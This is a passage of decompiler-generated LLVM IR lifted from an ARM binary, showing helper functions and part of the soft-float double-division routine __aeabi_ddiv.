  %v4_1a7b0 = udiv i32 %v0_1a7b4, 2097152
  %v5_1a7ac = or i32 %v4_1a7b0, %v1_1a778
  %v5_1a7b0 = or i32 %v5_1a7ac, %v4_1a7ac
  store i32 %v5_1a7b0, i32* %r1.global-to-local, align 4
  %v3_1a7b4 = mul i32 %v0_1a7b4, 2048
  %v4_1a7b8 = udiv i32 %v0_1a7bc, 2097152
  %v5_1a7b8 = or i32 %v3_1a7b4, %v4_1a7b8
  store i32 %v5_1a7b8, i32* %r0.global-to-local, align 4
  %v3_1a7bc = mul i32 %v0_1a7bc, 2048
  store i32 %v3_1a7bc, i32* %lr.global-to-local, align 4
  %v1_1a7c0 = add i32 %v6_1a798, -253
  store i32 %v1_1a7c0, i32* %ip.global-to-local, align 4
  %v2_1a7c0 = icmp ugt i32 %v6_1a798, 252
  %v7_1a7c0 = icmp eq i32 %v6_1a798, 253
  %v2_1a7c4 = xor i1 %v7_1a7c0, true
  %v3_1a7c4 = and i1 %v2_1a7c0, %v2_1a7c4
  br i1 %v3_1a7c4, label %bb43, label %bb44

bb43:                                             ; preds = %dec_label_pc_1a7ac
  %v6_1a7c4 = icmp ugt i32 %v1_1a7c0, 1791
  %v11_1a7c4 = icmp eq i32 %v1_1a7c0, 1792
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_1a7ac, %bb43
  %v1_1a7c8 = phi i1 [ %v7_1a7c0, %dec_label_pc_1a7ac ], [ %v11_1a7c4, %bb43 ]
  %v0_1a7c8 = phi i1 [ %v2_1a7c0, %dec_label_pc_1a7ac ], [ %v6_1a7c4, %bb43 ]
  %v2_1a7c8 = xor i1 %v1_1a7c8, true
  %v3_1a7c8 = and i1 %v0_1a7c8, %v2_1a7c8
  call void @__pseudo_cond_branch(i1 %v3_1a7c8, i32 ptrtoint (i32* @global_var_1a814.986 to i32))
  %v0_1a7cc = load i32, i32* %lr.global-to-local, align 4
  %v2_1a7cc = icmp slt i32 %v0_1a7cc, 0
  %v6_1a7cc = icmp eq i32 %v0_1a7cc, -2147483648
  %v1_1a7d0 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v6_1a7cc, label %bb45, label %._crit_edge

bb45:                                             ; preds = %bb44
  %v2_1a7d0 = urem i32 %v1_1a7d0, 2
  %v3_1a7d0 = icmp ne i32 %v2_1a7d0, 0
  %v4_1a7d0 = udiv i32 %v1_1a7d0, 2
  store i32 %v4_1a7d0, i32* %lr.global-to-local, align 4
  br label %._crit_edge

._crit_edge:                                      ; preds = %bb44, %bb45
  %v1_1a7d4 = phi i1 [ %v3_1a7d0, %bb45 ], [ %v2_1a7cc, %bb44 ]
  %v2_1a7d4 = zext i1 %v1_1a7d4 to i32
  %v3_1a7d4 = add i32 %v2_1a7d4, %v1_1a7d0
  store i32 %v3_1a7d4, i32* %r0.global-to-local, align 4
  %v0_1a7d8 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a7d8 = load i32, i32* %r4.global-to-local, align 4
  %v2_1a7d8 = and i32 %v1_1a7d8, 4096
  %v3_1a7d8 = icmp ne i32 %v2_1a7d8, 0
  %v4_1a7d8 = mul i32 %v1_1a7d8, 1048576
  %v6_1a7d8 = add i32 %v4_1a7d8, %v0_1a7d8
  %v7_1a7d8 = zext i1 %v3_1a7d8 to i32
  %v8_1a7d8 = add i32 %v7_1a7d8, %v6_1a7d8
  store i32 %v8_1a7d8, i32* %r1.global-to-local, align 4
  %v2_1a7dc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1a7dc, i32* %r4.global-to-local, align 4
  store i32 %v12_1a728, i32* %lr.global-to-local, align 4
  ret i32 %v3_1a7d4

dec_label_pc_1a7e4:                               ; preds = %.thread3, %bb40
  %v1_1a7f0 = phi i32 [ %v1_1a7647, %.thread3 ], [ %v1_1a764, %bb40 ]
  %v1_1a7e8 = phi i32 [ %v1_1a7605, %.thread3 ], [ %v1_1a760, %bb40 ]
  %v1_1a7e4 = and i32 %v2_1a74c, -2147483648
  %v2_1a7e8 = or i32 %v1_1a7e8, %v1_1a7e4
  %v4_1a7ec1 = or i64 %tmp, %arg1
  %v4_1a7ec = trunc i64 %v4_1a7ec1 to i32
  store i32 %v4_1a7ec, i32* %r0.global-to-local, align 4
  %v2_1a7f0 = xor i32 %v2_1a7e8, %v1_1a7f0
  store i32 %v2_1a7f0, i32* %r1.global-to-local, align 4
  %v4_1a7f4 = udiv i32 %v1_1a750, 2
  %v5_1a7f4 = sub i32 %v2_1a748, %v4_1a7f4
  store i32 %v5_1a7f4, i32* %r4.global-to-local, align 4
  %v7_1a7f4 = sub i32 0, %v5_1a7f4
  %v8_1a7f4 = and i32 %v2_1a748, %v7_1a7f4
  %v11_1a7f4 = icmp eq i32 %v2_1a748, %v4_1a7f4
  %v7_1a7f8 = icmp sgt i32 %v2_1a748, %v4_1a7f4
  br i1 %v7_1a7f8, label %bb46, label %bb47

bb46:                                             ; preds = %dec_label_pc_1a7e4
  %v10_1a7f8 = sub i32 %v1_1a750, %v5_1a7f4
  %v12_1a7f8 = xor i32 %v5_1a7f4, %v1_1a750
  %v13_1a7f8 = xor i32 %v10_1a7f8, %v1_1a750
  %v14_1a7f8 = and i32 %v13_1a7f8, %v12_1a7f8
  %v17_1a7f8 = icmp eq i32 %v1_1a750, %v5_1a7f4
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_1a7e4, %bb46
  %v3_1a804.in = phi i32 [ %v8_1a7f4, %dec_label_pc_1a7e4 ], [ %v14_1a7f8, %bb46 ]
  %v2_1a804.in = phi i32 [ %v5_1a7f4, %dec_label_pc_1a7e4 ], [ %v10_1a7f8, %bb46 ]
  %v1_1a804 = phi i1 [ %v11_1a7f4, %dec_label_pc_1a7e4 ], [ %v17_1a7f8, %bb46 ]
  %v2_1a804 = icmp slt i32 %v2_1a804.in, 0
  %v3_1a804 = icmp slt i32 %v3_1a804.in, 0
  %v3_1a7fc = xor i1 %v3_1a804, %v2_1a804
  %v4_1a7fc = or i1 %v1_1a804, %v3_1a7fc
  br i1 %v4_1a7fc, label %._crit_edge23, label %bb48

._crit_edge23:                                    ; preds = %bb47
  %v0_1a804.pre = load i32, i32* %lr.global-to-local, align 4
  br label %bb49

bb48:                                             ; preds = %bb47
  %v9_1a7fc30 = mul i32 %v5_1a7f4, 1048576
  %v10_1a7fc31 = or i32 %v2_1a7f0, %v9_1a7fc30
  store i32 %v10_1a7fc31, i32* %r1.global-to-local, align 4
  %v7_1a800 = load i32, i32* %stack_var_-16, align 4
  store i32 %v7_1a800, i32* %r4.global-to-local, align 4
  store i32 %v12_1a728, i32* %lr.global-to-local, align 4
  br label %bb49

bb49:                                             ; preds = %._crit_edge23, %bb48
  %v0_1a804 = phi i32 [ %v0_1a804.pre, %._crit_edge23 ], [ %v12_1a728, %bb48 ]
  %v6_1a804 = xor i1 %v4_1a7fc, true
  call void @__pseudo_cond_branch(i1 %v6_1a804, i32 %v0_1a804)
  %v0_1a808 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a808 = or i32 %v0_1a808, 1048576
  store i32 %v1_1a808, i32* %r1.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v0_1a810 = load i32, i32* %r4.global-to-local, align 4
  %v1_1a810 = add i32 %v0_1a810, -1
  store i32 %v1_1a810, i32* %r4.global-to-local, align 4
  ret i32 %v4_1a7ec

; uselistorder directives
  uselistorder i32 %v5_1a7f4, { 1, 0, 5, 3, 4, 2, 6 }
  uselistorder i32 %v4_1a7f4, { 2, 1, 0 }
  uselistorder i32 %v1_1a7d0, { 2, 0, 1 }
  uselistorder i32 %v0_1a7cc, { 1, 0 }
  uselistorder i1 %v7_1a7c0, { 1, 0 }
  uselistorder i32 %v2_1a7a0, { 1, 0 }
  uselistorder i1 %v1_1a7a0, { 1, 0 }
  uselistorder i32 %v6_1a798, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1a7a0, { 1, 0, 2 }
  uselistorder i32 %v14_1a784, { 1, 3, 2, 0 }
  uselistorder i64 %v11_1a784, { 1, 0 }
  uselistorder i64 %v12_1a77c, { 1, 0 }
  uselistorder i64 %v10_1a77c, { 1, 0 }
  uselistorder i64 %v7_1a774, { 1, 0 }
  uselistorder i64 %v6_1a76c, { 1, 0 }
  uselistorder i32 %v6_1a754, { 1, 0 }
  uselistorder i32 %v6_1a750, { 1, 0, 2 }
  uselistorder i32 %v1_1a750, { 5, 2, 3, 4, 1, 0 }
  uselistorder i32 %v2_1a748, { 4, 3, 0, 2, 1, 5, 6 }
  uselistorder i32 %v6_1a738, { 2, 1, 0 }
  uselistorder i32 %v5_1a734, { 2, 1, 0 }
  uselistorder i32 %v12_1a728, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 1, 4, 5, 6, 7, 8, 10, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 0, 9 }
  uselistorder i32 -255, { 6, 0, 2, 3, 1, 4, 5 }
  uselistorder i32 %arg4, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 2, 3, 1, 4 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_1a7e4, { 1, 0 }
  uselistorder label %._crit_edge, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %dec_label_pc_1a7ac, { 1, 0 }
  uselistorder label %bb42, { 1, 0 }
  uselistorder label %.thread2, { 3, 2, 1, 0 }
}

define i32 @function_1a814() local_unnamed_addr {
dec_label_pc_1a814:
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_16 = alloca i32, align 4
  %v0_1a814 = load i1, i1* @cpsr_z, align 1
  %v1_1a814 = load i1, i1* @cpsr_n, align 1
  %v2_1a814 = load i1, i1* @cpsr_v, align 1
  %v3_1a814 = xor i1 %v1_1a814, %v2_1a814
  %v4_1a814 = or i1 %v0_1a814, %v3_1a814
  br i1 %v4_1a814, label %dec_label_pc_1a818, label %dec_label_pc_1a990

dec_label_pc_1a818:                               ; preds = %dec_label_pc_1a814
  %v0_1a818 = load i32, i32* @r4, align 4
  %v4_1a818 = add i32 %v0_1a818, 54
  %v6_1a818 = sub i32 0, %v0_1a818
  %v7_1a818 = and i32 %v4_1a818, %v6_1a818
  %v8_1a818 = icmp slt i32 %v7_1a818, 0
  %v9_1a818 = icmp slt i32 %v4_1a818, 0
  %v10_1a818 = icmp eq i32 %v4_1a818, 0
  %v7_1a81c = icmp sgt i32 %v0_1a818, -54
  br i1 %v7_1a81c, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_1a818
  store i32 0, i32* @r0, align 4
  %v8_1a820 = load i32, i32* @r1, align 4
  %v9_1a820 = and i32 %v8_1a820, -2147483648
  store i32 %v9_1a820, i32* @r1, align 4
  store i32 %tmp10, i32* @r4, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1a818, %bb
  %v4_1a828 = xor i1 %v9_1a818, %v8_1a818
  %v5_1a828 = or i1 %v10_1a818, %v4_1a828
  call void @__pseudo_cond_branch(i1 %v5_1a828, i32 %tmp7)
  %v0_1a82c = load i32, i32* @r4, align 4
  %v1_1a82c = sub i32 0, %v0_1a82c
  %v2_1a830 = sub i32 -32, %v0_1a82c
  %v4_1a830 = add i32 %v0_1a82c, 31
  %v5_1a830 = and i32 %v4_1a830, %v1_1a82c
  %v6_1a830 = icmp slt i32 %v5_1a830, 0
  store i1 %v6_1a830, i1* @cpsr_v, align 1
  %v6_1a834 = icmp slt i32 %v1_1a82c, 32
  br i1 %v6_1a834, label %dec_label_pc_1a838, label %dec_label_pc_1a8a4

dec_label_pc_1a838:                               ; preds = %.thread1
  %v1_1a838 = add i32 %v2_1a830, 12
  %v8_1a83c = icmp sgt i32 %v1_1a838, 0
  br i1 %v8_1a83c, label %dec_label_pc_1a874, label %dec_label_pc_1a840

dec_label_pc_1a840:                               ; preds = %dec_label_pc_1a838
  %v1_1a840 = add i32 %v2_1a830, 32
  %v1_1a844 = sub i32 0, %v2_1a830
  %v0_1a848 = load i32, i32* @r0, align 4
  %v6_1a848 = shl i32 %v0_1a848, %v1_1a844
  %v2_1a84c = add i32 %v2_1a830, 31
  %v3_1a84c = shl i32 1, %v2_1a84c
  %v6_1a84c = lshr i32 %v0_1a848, %v1_1a840
  %v1_1a850 = load i32, i32* @r1, align 4
  %v7_1a850 = shl i32 %v1_1a850, %v1_1a844
  %v8_1a850 = or i32 %v7_1a850, %v6_1a84c
  %v1_1a854 = and i32 %v1_1a850, -2147483648
  %tmp = bitcast i32 %v1_1a850 to float
  %tmp19 = call float @fabsf(float %tmp)
  %v1_1a858 = bitcast float %tmp19 to i32
  %tmp20 = icmp slt i32 %v6_1a848, 0
  %v4_1a85c = zext i1 %tmp20 to i32
  %v5_1a85c = add i32 %v8_1a850, %v4_1a85c
  %v5_1a860 = and i32 %v1_1a858, %v3_1a84c
  %v6_1a860 = icmp ne i32 %v5_1a860, 0
  %v7_1a860 = lshr i32 %v1_1a858, %v1_1a840
  %v9_1a860 = add i32 %v7_1a860, %v1_1a854
  %v10_1a860 = zext i1 %v6_1a860 to i32
  %v11_1a860 = add i32 %v9_1a860, %v10_1a860
  store i32 %v11_1a860, i32* @r1, align 4
  %v19_1a860 = add i32 %v11_1a860, %v10_1a860
  %v20_1a860 = xor i32 %v19_1a860, %v1_1a850
  %v21_1a860 = xor i32 %v19_1a860, %v7_1a860
  %v22_1a860 = and i32 %v20_1a860, %v21_1a860
  %v23_1a860 = icmp slt i32 %v22_1a860, 0
  store i1 %v23_1a860, i1* @cpsr_v, align 1
  %v3_1a864 = mul i32 %v6_1a848, 2
  %v4_1a864 = or i32 %v3_1a864, %tmp7
  %v5_1a864 = icmp slt i32 %v4_1a864, 0
  store i1 %v5_1a864, i1* @cpsr_n, align 1
  %v6_1a864 = icmp eq i32 %v4_1a864, 0
  store i1 %v6_1a864, i1* @cpsr_z, align 1
  br i1 %v6_1a864, label %bb13, label %bb14

bb13:                                             ; preds = %dec_label_pc_1a840
  %tmp21 = sext i1 %tmp20 to i32
  %v6_1a868 = add nsw i32 %tmp21, -1
  %v7_1a868 = and i32 %v5_1a85c, %v6_1a868
  br label %bb14

bb14:                                             ; preds = %dec_label_pc_1a840, %bb13
  %v1_1a870 = phi i32 [ %v5_1a85c, %dec_label_pc_1a840 ], [ %v7_1a868, %bb13 ]
  %v2_1a86c = load i32, i32* %stack_var_16, align 4
  store i32 %v2_1a86c, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_1a870

dec_label_pc_1a874:                               ; preds = %dec_label_pc_1a838
  %v1_1a874 = sub i32 0, %v2_1a830
  %v1_1a878 = add i32 %v2_1a830, 32
  %v0_1a87c = load i32, i32* @r0, align 4
  %v6_1a87c = shl i32 %v0_1a87c, %v1_1a874
  %v6_1a880 = lshr i32 %v0_1a87c, %v1_1a878
  %v1_1a884 = load i32, i32* @r1, align 4
  %v7_1a884 = shl i32 %v1_1a884, %v1_1a874
  %v8_1a884 = or i32 %v7_1a884, %v6_1a880
  %v1_1a888 = and i32 %v1_1a884, -2147483648
  %tmp22 = icmp slt i32 %v6_1a87c, 0
  %v4_1a88c = zext i1 %tmp22 to i32
  %v5_1a88c = add i32 %v8_1a884, %v4_1a88c
  %v6_1a88c = icmp ult i32 %v5_1a88c, %v8_1a884
  %v2_1a890 = zext i1 %v6_1a88c to i32
  %v3_1a890 = or i32 %v2_1a890, %v1_1a888
  store i32 %v3_1a890, i32* @r1, align 4
  %v9_1a890 = add nsw i32 %v3_1a890, %v2_1a890
  %v10_1a890 = sub i32 0, %v1_1a884
  %v11_1a890 = and i32 %v9_1a890, %v10_1a890
  %v12_1a890 = icmp slt i32 %v11_1a890, 0
  store i1 %v12_1a890, i1* @cpsr_v, align 1
  %v3_1a894 = mul i32 %v6_1a87c, 2
  %v4_1a894 = or i32 %v3_1a894, %tmp7
  %v5_1a894 = icmp slt i32 %v4_1a894, 0
  store i1 %v5_1a894, i1* @cpsr_n, align 1
  %v6_1a894 = icmp eq i32 %v4_1a894, 0
  store i1 %v6_1a894, i1* @cpsr_z, align 1
  br i1 %v6_1a894, label %bb15, label %bb16

bb15:                                             ; preds = %dec_label_pc_1a874
  %tmp23 = sext i1 %tmp22 to i32
  %v6_1a898 = add nsw i32 %tmp23, -1
  %v7_1a898 = and i32 %v5_1a88c, %v6_1a898
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_1a874, %bb15
  %v1_1a8a0 = phi i32 [ %v5_1a88c, %dec_label_pc_1a874 ], [ %v7_1a898, %bb15 ]
  %v2_1a89c = load i32, i32* %stack_var_16, align 4
  store i32 %v2_1a89c, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_1a8a0

dec_label_pc_1a8a4:                               ; preds = %.thread1
  %v1_1a8a4 = sub i32 32, %v2_1a830
  %v1_1a8a8 = load i32, i32* @r0, align 4
  %v7_1a8a8 = shl i32 %v1_1a8a8, %v1_1a8a4
  %v8_1a8a8 = or i32 %v7_1a8a8, %tmp7
  %v6_1a8ac = lshr i32 %v1_1a8a8, %v2_1a830
  %v1_1a8b0 = load i32, i32* @r1, align 4
  %v7_1a8b0 = shl i32 %v1_1a8b0, %v1_1a8a4
  %v8_1a8b0 = or i32 %v7_1a8b0, %v6_1a8ac
  %v6_1a8b4 = lshr i32 %v1_1a8b0, %v2_1a830
  %v1_1a8b8 = and i32 %v1_1a8b0, -2147483648
  store i32 %v1_1a8b8, i32* @r1, align 4
  %v7_1a8bc = lshr i32 %v1_1a8b8, %v2_1a830
  %v8_1a8bc = sub i32 -1, %v7_1a8bc
  %v9_1a8bc = and i32 %v6_1a8b4, %v8_1a8bc
  %tmp24 = icmp slt i32 %v8_1a8b0, 0
  %v4_1a8c0 = zext i1 %tmp24 to i32
  %v5_1a8c0 = add i32 %v4_1a8c0, %v9_1a8bc
  %v3_1a8c4 = mul i32 %v8_1a8b0, 2
  %v4_1a8c4 = or i32 %v8_1a8a8, %v3_1a8c4
  %v5_1a8c4 = icmp slt i32 %v4_1a8c4, 0
  store i1 %v5_1a8c4, i1* @cpsr_n, align 1
  %v6_1a8c4 = icmp eq i32 %v4_1a8c4, 0
  store i1 %v6_1a8c4, i1* @cpsr_z, align 1
  br i1 %v6_1a8c4, label %bb17, label %bb18

bb17:                                             ; preds = %dec_label_pc_1a8a4
  %tmp25 = sext i1 %tmp24 to i32
  %v6_1a8c8 = add nsw i32 %tmp25, -1
  %v7_1a8c8 = and i32 %v5_1a8c0, %v6_1a8c8
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_1a8a4, %bb17
  %v1_1a8d0 = phi i32 [ %v5_1a8c0, %dec_label_pc_1a8a4 ], [ %v7_1a8c8, %bb17 ]
  %v2_1a8cc = load i32, i32* %stack_var_16, align 4
  store i32 %v2_1a8cc, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_1a8d0

dec_label_pc_1a990:                               ; preds = %dec_label_pc_1a814
  %v0_1a990 = load i32, i32* @r1, align 4
  %v1_1a990 = and i32 %v0_1a990, -2147483648
  %v1_1a998 = or i32 %v1_1a990, 2146435072
  store i32 %v1_1a998, i32* @r1, align 4
  store i32 %tmp10, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v5_1a8c0, { 1, 0 }
  uselistorder i32 %v5_1a88c, { 1, 0, 2 }
  uselistorder i32 %v8_1a884, { 1, 0 }
  uselistorder i32 %v1_1a874, { 1, 0 }
  uselistorder i32 %v5_1a85c, { 1, 0 }
  uselistorder i32 %v1_1a850, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1a844, { 1, 0 }
  uselistorder i32 %v2_1a830, { 5, 6, 7, 9, 0, 1, 2, 3, 4, 8 }
  uselistorder i32 %v1_1a82c, { 1, 0 }
  uselistorder i32 %v4_1a818, { 1, 2, 0 }
  uselistorder i32 %v0_1a818, { 1, 0, 2 }
  uselistorder i32 %tmp10, { 1, 0 }
  uselistorder i32 %tmp6, { 2, 1, 0 }
  uselistorder i32 %tmp5, { 2, 1, 0 }
  uselistorder i32 12, { 46, 47, 64, 71, 8, 72, 75, 3, 1, 2, 76, 77, 5, 0, 4, 87, 28, 10, 32, 11, 12, 73, 74, 29, 30, 31, 70, 13, 88, 89, 9, 135, 136, 137, 138, 139, 141, 142, 140, 143, 144, 145, 146, 147, 148, 149, 14, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 15, 65, 66, 67, 68, 69, 33, 34, 16, 35, 36, 37, 63, 95, 38, 39, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 6, 78, 79, 80, 81, 82, 17, 83, 18, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 131, 124, 125, 126, 127, 128, 129, 130, 132, 133, 19, 134, 84, 7, 20, 21, 22, 24, 23, 25, 61, 85, 86, 26, 40, 41, 42, 43, 44, 45, 27, 62, 90, 91, 92, 93, 94 }
  uselistorder i32 -32, { 4, 3, 5, 6, 7, 11, 8, 12, 13, 9, 2, 10, 0, 1, 14 }
  uselistorder i32 54, { 2, 0, 1 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_1a9a8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1a9a8:
  %v1_1a9ac = or i32 %arg1, 2146959360
  store i32 %v1_1a9ac, i32* @r1, align 4
  %v1_1a9b4 = load i32, i32* @r0, align 4
  ret i32 %v1_1a9b4
}

define i32 @__aeabi_ddiv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1a9b8 = load i32, i32* @r4, align 4
  store i32 %v3_1a9b8, i32* %stack_var_-16, align 4
  %v6_1a9b8 = load i32, i32* @r5, align 4
  %v9_1a9b8 = load i32, i32* @r6, align 4
  %v12_1a9b8 = load i32, i32* @lr, align 4
  store i32 2047, i32* %ip.global-to-local, align 4
  %v1_1a9c4 = load i32, i32* @r1, align 4
  %v4_1a9c4 = udiv i32 %v1_1a9c4, 1048576
  %v5_1a9c4 = urem i32 %v4_1a9c4, 2048
  store i32 %v5_1a9c4, i32* @r4, align 4
  %v6_1a9c4 = icmp eq i32 %v5_1a9c4, 0
  br i1 %v6_1a9c4, label %entry..thread2_crit_edge, label %bb

entry..thread2_crit_edge:                         ; preds = %entry
  %.pre147 = udiv i32 %arg4, 1048576
  br label %.thread2

bb:                                               ; preds = %entry
  %v5_1a9c8 = udiv i32 %arg4, 1048576
  %v6_1a9c8 = urem i32 %v5_1a9c8, 2048
  store i32 %v6_1a9c8, i32* %r5.global-to-local, align 4
  %v7_1a9c8 = icmp eq i32 %v6_1a9c8, 0
  br i1 %v7_1a9c8, label %.thread1, label %bb90

.thread1:                                         ; preds = %bb
  br label %dec_label_pc_1ab54

bb90:                                             ; preds = %bb
  %v5_1a9cc = icmp eq i32 %v5_1a9c4, 2047
  br i1 %v5_1a9cc, label %.thread2, label %bb91

.thread2:                                         ; preds = %entry..thread2_crit_edge, %bb90
  %.pre145.pre-phi = phi i32 [ %.pre147, %entry..thread2_crit_edge ], [ %v5_1a9c8, %bb90 ]
  br label %dec_label_pc_1ab54

bb91:                                             ; preds = %bb90
  %v5_1a9d0 = icmp eq i32 %v6_1a9c8, 2047
  br i1 %v5_1a9d0, label %dec_label_pc_1ab54, label %dec_label_pc_1a9d8

dec_label_pc_1a9d8:                               ; preds = %bb91
  %v2_1a9d8 = sub nsw i32 %v5_1a9c4, %v6_1a9c8
  store i32 %v2_1a9d8, i32* %r4.global-to-local, align 4
  %v2_1a9dc = xor i32 %v1_1a9c4, %arg4
  %v4_1a9e0 = mul i32 %arg4, 4096
  %v5_1a9e0 = or i32 %v4_1a9e0, %arg3
  store i32 %v5_1a9e0, i32* %r5.global-to-local, align 4
  %v7_1a9e0 = icmp eq i32 %v5_1a9e0, 0
  %v3_1a9e4 = mul i32 %v1_1a9c4, 4096
  store i32 %v3_1a9e4, i32* %r1.global-to-local, align 4
  br i1 %v7_1a9e0, label %dec_label_pc_1ab20, label %dec_label_pc_1a9ec

dec_label_pc_1a9ec:                               ; preds = %dec_label_pc_1a9d8
  %tmp92 = mul i32 %arg4, 256
  %v4_1a9f4 = and i32 %tmp92, 268435200
  %v4_1a9f8 = udiv i32 %arg3, 16777216
  %v5_1a9f4 = or i32 %v4_1a9f8, %v4_1a9f4
  %v5_1a9f8 = or i32 %v5_1a9f4, 268435456
  store i32 %v5_1a9f8, i32* %r3.global-to-local, align 4
  %v3_1a9fc = mul i32 %arg3, 256
  store i32 %v3_1a9fc, i32* %r2.global-to-local, align 4
  %tmp93 = mul i32 %v1_1a9c4, 256
  %v4_1aa00 = and i32 %tmp93, 268435200
  %v1_1aa04 = load i32, i32* @r0, align 4
  %v4_1aa04 = udiv i32 %v1_1aa04, 16777216
  %v5_1aa00 = or i32 %v4_1aa00, %v4_1aa04
  %v5_1aa04 = or i32 %v5_1aa00, 268435456
  store i32 %v5_1aa04, i32* %r5.global-to-local, align 4
  %v3_1aa08 = mul i32 %v1_1aa04, 256
  store i32 %v3_1aa08, i32* %r6.global-to-local, align 4
  %v1_1aa0c = and i32 %v2_1a9dc, -2147483648
  store i32 %v1_1aa0c, i32* %r1.global-to-local, align 4
  %v3_1aa10 = icmp uge i32 %v5_1aa04, %v5_1a9f8
  %v9_1aa10 = icmp eq i32 %v5_1aa04, %v5_1a9f8
  br i1 %v9_1aa10, label %bb94, label %bb95

bb94:                                             ; preds = %dec_label_pc_1a9ec
  %v4_1aa14 = icmp uge i32 %v3_1aa08, %v3_1a9fc
  br label %bb95

bb95:                                             ; preds = %dec_label_pc_1a9ec, %bb94
  %v1_1aa18 = phi i1 [ %v3_1aa10, %dec_label_pc_1a9ec ], [ %v4_1aa14, %bb94 ]
  %v2_1aa18 = add nsw i32 %v2_1a9d8, 253
  %v3_1aa18 = zext i1 %v1_1aa18 to i32
  %v4_1aa18 = add nsw i32 %v2_1aa18, %v3_1aa18
  %v8_1aa18 = icmp ule i32 %v4_1aa18, %v2_1a9d8
  %v9_1aa18 = icmp ugt i32 %v2_1a9d8, -254
  %v10_1aa18 = select i1 %v1_1aa18, i1 %v8_1aa18, i1 %v9_1aa18
  %v1_1aa1c = add nsw i32 %v4_1aa18, 768
  store i32 %v1_1aa1c, i32* %r4.global-to-local, align 4
  br i1 %v10_1aa18, label %dec_label_pc_1aa2c, label %dec_label_pc_1aa24

dec_label_pc_1aa24:                               ; preds = %bb95
  %v3_1aa24 = udiv i32 %v5_1a9f8, 2
  store i32 %v3_1aa24, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1aa2c

dec_label_pc_1aa2c:                               ; preds = %bb95, %dec_label_pc_1aa24
  %v0_1aa34 = phi i32 [ %v5_1a9f8, %bb95 ], [ %v3_1aa24, %dec_label_pc_1aa24 ]
  %v0_1aa38 = phi i32 [ %v3_1a9fc, %bb95 ], [ 0, %dec_label_pc_1aa24 ]
  %v2_1aa2c = sub i32 %v3_1aa08, %v0_1aa38
  store i32 %v2_1aa2c, i32* %r6.global-to-local, align 4
  %v3_1aa2c = icmp uge i32 %v3_1aa08, %v0_1aa38
  %v3_1aa30 = icmp eq i1 %v3_1aa2c, false
  %v4_1aa30 = sub nsw i32 %v5_1aa04, %v0_1aa34
  %v6_1aa30 = sext i1 %v3_1aa30 to i32
  %v7_1aa30 = add nsw i32 %v6_1aa30, %v4_1aa30
  store i32 %v7_1aa30, i32* %r5.global-to-local, align 4
  %v3_1aa34 = udiv i32 %v0_1aa34, 2
  store i32 %v3_1aa34, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1aa44.outer

dec_label_pc_1aa44.outer:                         ; preds = %dec_label_pc_1aadc, %dec_label_pc_1aa2c
  %v1_1aaf0.ph = phi i32 [ %v2_1aadc, %dec_label_pc_1aadc ], [ %v1_1aa0c, %dec_label_pc_1aa2c ]
  %v0_1aa48.ph = phi i32 [ %v5_1aab8, %dec_label_pc_1aadc ], [ %v7_1aa30, %dec_label_pc_1aa2c ]
  %v1_1aa4c.ph = phi i32 [ %v3_1aabc, %dec_label_pc_1aadc ], [ %v2_1aa2c, %dec_label_pc_1aa2c ]
  %v5_1aac417.ph = phi i32 [ %v5_1aac4, %dec_label_pc_1aadc ], [ %v3_1aa34, %dec_label_pc_1aa2c ]
